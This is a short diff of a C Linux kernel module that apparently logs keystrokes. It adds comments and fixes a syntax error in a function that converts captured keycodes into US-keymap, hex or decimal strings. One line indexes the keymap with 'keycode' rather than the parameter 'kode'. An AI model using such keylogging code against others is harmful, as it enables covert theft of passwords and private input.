@@ -94,19 +94,19 @@ static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *of
 void string_conv(int kode, int shifted, char *buffer, int sys) {
 	switch (sys) {
 	case US: // For US system
-		if (kode > KEY_RESERVED && kode <= KEY_PAUSE) {
+		if (kode > KEY_RESERVED && kode <= KEY_PAUSE) { // check to see if kode is in the valid range for us keymap
 			const char *us_key = (shifted == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0]; // Determine if shift key was pressed
-			snprintf(buffer, CHUNK_LEN, "%s", us_key);
+			snprintf(buffer, CHUNK_LEN, "%s", us_key); // store the string in the buffer
 		} // if statement
 		break;
 	case HEX: // For hexadecimal system
-		if (kode > KEY_RESERVED && kode < KEY_MAX) {
-			snprintf(buffer, CHUNK_LEN, "%x %x", kode, shifted);
+		if (kode > KEY_RESERVED && kode < KEY_MAX) { // check to see if kode is in the valid range for hexadecimal keymap
+			snprintf(buffer, CHUNK_LEN, "%x %x", kode, shifted); // store the string in the buffer
 		} // if statement 
 		break;
 	case DEC: // For decimal system
-		if (kode > KEY_RESERVED && kode < KEY_MAX) {
-			snprintf(buffer, CHUNK_LEN, "%d %d", kode, shifted;
+		if (kode > KEY_RESERVED && kode < KEY_MAX) { // check to see if kode is in the valid range for decimal keymap
+			snprintf(buffer, CHUNK_LEN, "%d %d", kode, shifted); // store the string in the buffer
 		} // if statement
 		break;
 	} // switch statement
